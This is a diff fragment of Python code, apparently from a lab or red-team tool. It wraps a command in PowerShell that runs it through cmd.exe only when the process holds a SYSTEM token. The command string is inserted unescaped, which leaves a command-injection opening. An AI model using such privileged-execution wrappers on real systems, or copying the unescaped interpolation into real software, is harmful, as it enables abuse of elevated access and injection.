+                    ps_wrapper = f"""
+                    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                    $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                    if (-not $isSystem) {{
+                        Write-Error 'SYSTEM token not available'
+                        exit 1
+                    }}
+                    $proc = Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', '{command}' -NoNewWindow -Wait -PassThru
+                    exit $proc.ExitCode
+                    """
+                    exit_code, stdout, stderr = execute_powershell(ps_wrapper, lab_use=self.session_data.get('LAB_USE', 0))
+                    return {
+                        'success': exit_code == 0,
+                        'exit_code': exit_code,
+                        'stdout': stdout,
+                        'stderr': stderr
+                    }
             
             if language == 'powershell':
                 exit_code, stdout, stderr = execute_powershell(
